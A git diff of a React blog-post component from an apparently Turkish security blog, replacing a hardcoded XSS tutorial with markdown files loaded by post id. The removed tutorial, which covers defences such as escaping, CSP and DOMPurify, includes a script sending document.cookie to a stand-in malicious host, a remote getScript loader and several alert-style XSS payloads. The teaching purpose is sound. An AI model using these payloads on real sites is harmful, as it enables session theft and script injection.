@@ -7,169 +7,76 @@ import { Calendar, User, ArrowLeft, Clock } from "lucide-react";
 import ReactMarkdown from "react-markdown";
 import { Prism as SyntaxHighlighter } from "react-syntax-highlighter";
 import { oneDark } from "react-syntax-highlighter/dist/esm/styles/prism";
+import { useState, useEffect } from "react";
 
 const BlogPost = () => {
   const { id } = useParams();
+  const [markdownContent, setMarkdownContent] = useState("");
+  const [loading, setLoading] = useState(true);
 
-  // Örnek blog yazısı (gerçek uygulamada API'den gelecek)
-  const post = {
-    id: "1",
-    title: "Web Uygulamalarında XSS Saldırıları ve Korunma Yöntemleri",
-    category: "Web Application Security",
-    date: "2024-01-15",
-    author: "Sen",
-    readTime: "8 dakika",
-    content: `# Web Uygulamalarında XSS Saldırıları ve Korunma Yöntemleri
-
-Cross-Site Scripting (XSS) saldırıları, web güvenliğinin en yaygın ve tehlikeli tehditlerinden biridir. Bu yazıda XSS saldırılarının türlerini, nasıl çalıştığını ve etkili korunma yöntemlerini inceleyeceğiz.
-
-## XSS Nedir?
-
-XSS, saldırganların web uygulamalarına kötü amaçlı JavaScript kodu enjekte etmesine olanak tanıyan bir güvenlik açığıdır. Bu kodlar, kullanıcının tarayıcısında çalışarak hassas bilgilerin çalınmasına neden olabilir.
-
-## XSS Türleri
-
-### 1. Stored XSS (Kalıcı XSS)
-Kötü amaçlı kod doğrudan sunucuda saklanır ve her kullanıcı o sayfayı ziyaret ettiğinde çalışır.
-
-\`\`\`javascript
-// Örnek zarar verici kod
-<script>
-  // Kullanıcının cookie'lerini çal
-  fetch('http://malicious-site.com/steal', {
-    method: 'POST',
-    body: document.cookie
-  });
-</script>
-\`\`\`
-
-### 2. Reflected XSS (Yansıyan XSS)
-Kötü amaçlı kod URL parametresi olarak gönderilir ve sunucu tarafından yansıtılır.
-
-### 3. DOM-based XSS
-Saldırı tamamen client-side'da gerçekleşir ve DOM manipülasyonu yoluyla çalışır.
-
-## Korunma Yöntemleri
-
-### 1. Input Validation (Giriş Doğrulama)
-\`\`\`javascript
-function validateInput(input) {
-  // HTML karakterlerini escape et
-  return input
-    .replace(/&/g, "&amp;")
-    .replace(/</g, "&lt;")
-    .replace(/>/g, "&gt;")
-    .replace(/"/g, "&quot;")
-    .replace(/'/g, "&#x27;");
-}
-\`\`\`
-
-### 2. Content Security Policy (CSP)
-\`\`\`html
-<meta http-equiv="Content-Security-Policy" 
-      content="default-src 'self'; script-src 'self'">
-\`\`\`
-
-### 3. HttpOnly ve Secure Cookies
-\`\`\`javascript
-// Güvenli cookie ayarlama
-document.cookie = "sessionId=abc123; HttpOnly; Secure; SameSite=Strict";
-\`\`\`
-
-## Gerçek Dünya Örnekleri
-
-### Facebook'ta XSS Zafiyet Örneği (2011)
-Facebook'ta keşfedilen bir XSS açığı, kullanıcıların profil sayfalarına zararlı kod yerleştirmelerine olanak tanıyordu:
-
-\`\`\`javascript
-// Örnek saldırı vektörü
-javascript:void($.getScript('http://attacker.com/malicious.js'))
-\`\`\`
-
-### Twitter'da Self-XSS Saldırısı
-Kullanıcıları, konsola kod yapıştırmaya ikna eden sosyal mühendislik saldırısı:
-
-\`\`\`javascript
-// Kullanıcıları kandırmaya yönelik kod
-console.log("Bu kodu çalıştırırsanız hesabınız hack'lenebilir!");
-\`\`\`
-
-## İleri Seviye Korunma Teknikleri
-
-### 1. DOM Purify Kullanımı
-\`\`\`javascript
-import DOMPurify from 'dompurify';
-
-// Güvenli HTML temizleme
-const cleanHTML = DOMPurify.sanitize(dirtyHTML);
-document.getElementById('content').innerHTML = cleanHTML;
-\`\`\`
-
-### 2. React'ta Güvenli Rendering
-\`\`\`jsx
-// Güvenli - React otomatik olarak escape eder
-function SafeComponent({ userInput }) {
-  return <div>{userInput}</div>;
-}
-
-// Tehlikeli - dangerouslySetInnerHTML kullanımı
-function DangerousComponent({ htmlContent }) {
-  return (
-    <div 
-      dangerouslySetInnerHTML={{
-        __html: DOMPurify.sanitize(htmlContent)
-      }} 
-    />
-  );
-}
-\`\`\`
-
-### 3. Express.js'te CSP Middleware
-\`\`\`javascript
-const helmet = require('helmet');
-
-app.use(helmet.contentSecurityPolicy({
-  directives: {
-    defaultSrc: ["'self'"],
-    scriptSrc: ["'self'", "'unsafe-inline'"],
-    styleSrc: ["'self'", "'unsafe-inline'"],
-    imgSrc: ["'self'", "data:", "https:"],
-  },
-}));
-\`\`\`
-
-## Penetration Testing için XSS Payloadları
-
-> **Uyarı:** Bu payloadlar sadece eğitim amaçlıdır ve sadece sahip olduğunuz sistemlerde test edilmelidir.
-
-\`\`\`javascript
-// Basit alert payload'u
-<script>alert('XSS')</script>
-
-// Image tag ile payload
-<img src=x onerror=alert('XSS')>
-
-// SVG ile payload
-<svg onload=alert('XSS')>
-
-// Form ile payload
-<form><button formaction=javascript:alert('XSS')>Test</button></form>
-\`\`\`
-
-## Sonuç
-
-XSS saldırıları ciddi güvenlik tehditleri oluşturabilir. Düzenli güvenlik testleri, input validation, CSP gibi koruma mekanizmalarını implement ederek bu tehditlere karşı korunabiliriz.
-
-### Önemli Hatırlatmalar:
-
-1. **Hiçbir zaman kullanıcı girdisine güvenmeyin**
-2. **Her zaman input validation yapın**
-3. **Output encoding kullanın**
-4. **Content Security Policy implementasyonu yapın**
-5. **Düzenli güvenlik testleri gerçekleştirin**
-
-**Unutmayın:** Güvenlik, bir hedef değil sürekli bir süreçtir. Her zaman güncel kalın ve yeni tehditlere karşı hazırlıklı olun.`
+  // Blog yazısı meta bilgileri
+  const posts = {
+    "1": {
+      title: "Web Uygulamalarında XSS Saldırıları ve Korunma Yöntemleri",
+      category: "Web Application Security",
+      date: "2024-01-15",
+      author: "Sen",
+      readTime: "8 dakika",
+      file: "xss.md"
+    },
+    "2": {
+      title: "Modern Frontend Geliştirmede React Hooks Kullanımı",
+      category: "Frontend Tech",
+      date: "2024-01-10",
+      author: "Sen",
+      readTime: "12 dakika",
+      file: "react-hooks.md"
+    },
+    "3": {
+      title: "SQL Injection Saldırıları ve Önleme Teknikleri",
+      category: "Web Application Security",
+      date: "2024-01-05",
+      author: "Sen",
+      readTime: "10 dakika",
+      file: "sql-injection.md"
+    },
+    "4": {
+      title: "TypeScript ile Type-Safe React Uygulamaları",
+      category: "Frontend Tech",
+      date: "2024-01-01",
+      author: "Sen",
+      readTime: "15 dakika",
+      file: "typescript-react.md"
+    }
   };
+
+  const post = posts[id as keyof typeof posts];
+
+  useEffect(() => {
+    const loadMarkdownContent = async () => {
+      if (!post) {
+        setLoading(false);
+        return;
+      }
+
+      try {
+        const response = await fetch(`/src/posts/${post.file}`);
+        if (response.ok) {
+          const content = await response.text();
+          setMarkdownContent(content);
+        } else {
+          setMarkdownContent("# İçerik Bulunamadı\n\nBu blog yazısı henüz hazır değil.");
+        }
+      } catch (error) {
+        console.error("Markdown dosyası yüklenemedi:", error);
+        setMarkdownContent("# Hata\n\nİçerik yüklenirken bir hata oluştu.");
+      } finally {
+        setLoading(false);
+      }
+    };
+
+    loadMarkdownContent();
+  }, [id, post]);
 
   const getCategoryColor = (category: string) => {
     switch(category) {
@@ -181,6 +88,18 @@ XSS saldırıları ciddi güvenlik tehditleri oluşturabilir. Düzenli güvenlik
         return "bg-gray-100 text-gray-800";
     }
   };
+
+  if (!post) {
+    return (
+      <div className="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50 flex items-center justify-center">
+        <Card className="p-8 text-center">
+          <h1 className="text-2xl font-bold text-gray-900 mb-4">Yazı Bulunamadı</h1>
+          <p className="text-gray-600 mb-4">Aradığınız blog yazısı mevcut değil.</p>
+          <Link to="/" className="text-blue-600 hover:text-blue-800">Ana Sayfaya Dön</Link>
+        </Card>
+      </div>
+    );
+  }
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50">
@@ -264,48 +183,54 @@ XSS saldırıları ciddi güvenlik tehditleri oluşturabilir. Düzenli güvenlik
           >
             <Card className="bg-white/80 backdrop-blur-sm border-0 shadow-xl">
               <CardContent className="p-8">
-                <div className="prose prose-lg max-w-none">
-                  <ReactMarkdown
-                    components={{
-                      code({ children, className, ...rest }) {
-                        const match = /language-(\w+)/.exec(className || '');
-                        return match ? (
-                          <SyntaxHighlighter
-                            style={oneDark}
-                            language={match[1]}
-                            PreTag="div"
-                            customStyle={{
-                              margin: '1.5rem 0',
-                              borderRadius: '0.5rem',
-                              fontSize: '0.875rem'
-                            }}
-                          >
-                            {String(children).replace(/\n$/, '')}
-                          </SyntaxHighlighter>
-                        ) : (
-                          <code className={className} {...rest}>
+                {loading ? (
+                  <div className="flex items-center justify-center py-12">
+                    <div className="text-gray-600">İçerik yükleniyor...</div>
+                  </div>
+                ) : (
+                  <div className="prose prose-lg max-w-none">
+                    <ReactMarkdown
+                      components={{
+                        code({ children, className, ...rest }) {
+                          const match = /language-(\w+)/.exec(className || '');
+                          return match ? (
+                            <SyntaxHighlighter
+                              style={oneDark}
+                              language={match[1]}
+                              PreTag="div"
+                              customStyle={{
+                                margin: '1.5rem 0',
+                                borderRadius: '0.5rem',
+                                fontSize: '0.875rem'
+                              }}
+                            >
+                              {String(children).replace(/\n$/, '')}
+                            </SyntaxHighlighter>
+                          ) : (
+                            <code className={className} {...rest}>
+                              {children}
+                            </code>
+                          );
+                        },
+                        h1: ({children}) => <h1 className="text-3xl font-bold text-gray-900 mt-8 mb-4">{children}</h1>,
+                        h2: ({children}) => <h2 className="text-2xl font-bold text-gray-900 mt-6 mb-3">{children}</h2>,
+                        h3: ({children}) => <h3 className="text-xl font-bold text-gray-900 mt-4 mb-2">{children}</h3>,
+                        p: ({children}) => <p className="text-gray-700 leading-relaxed mb-4">{children}</p>,
+                        strong: ({children}) => <strong className="font-bold text-gray-900">{children}</strong>,
+                        blockquote: ({children}) => (
+                          <blockquote className="border-l-4 border-blue-500 pl-4 italic text-gray-600 my-4 bg-blue-50 py-2">
                             {children}
-                          </code>
-                        );
-                      },
-                      h1: ({children}) => <h1 className="text-3xl font-bold text-gray-900 mt-8 mb-4">{children}</h1>,
-                      h2: ({children}) => <h2 className="text-2xl font-bold text-gray-900 mt-6 mb-3">{children}</h2>,
-                      h3: ({children}) => <h3 className="text-xl font-bold text-gray-900 mt-4 mb-2">{children}</h3>,
-                      p: ({children}) => <p className="text-gray-700 leading-relaxed mb-4">{children}</p>,
-                      strong: ({children}) => <strong className="font-bold text-gray-900">{children}</strong>,
-                      blockquote: ({children}) => (
-                        <blockquote className="border-l-4 border-blue-500 pl-4 italic text-gray-600 my-4 bg-blue-50 py-2">
-                          {children}
-                        </blockquote>
-                      ),
-                      ul: ({children}) => <ul className="list-disc list-inside mb-4 space-y-1">{children}</ul>,
-                      ol: ({children}) => <ol className="list-decimal list-inside mb-4 space-y-1">{children}</ol>,
-                      li: ({children}) => <li className="mb-1 text-gray-700">{children}</li>,
-                    }}
-                  >
-                    {post.content}
-                  </ReactMarkdown>
-                </div>
+                          </blockquote>
+                        ),
+                        ul: ({children}) => <ul className="list-disc list-inside mb-4 space-y-1">{children}</ul>,
+                        ol: ({children}) => <ol className="list-decimal list-inside mb-4 space-y-1">{children}</ol>,
+                        li: ({children}) => <li className="mb-1 text-gray-700">{children}</li>,
+                      }}
+                    >
+                      {markdownContent}
+                    </ReactMarkdown>
+                  </div>
+                )}
               </CardContent>
             </Card>
           </motion.div>
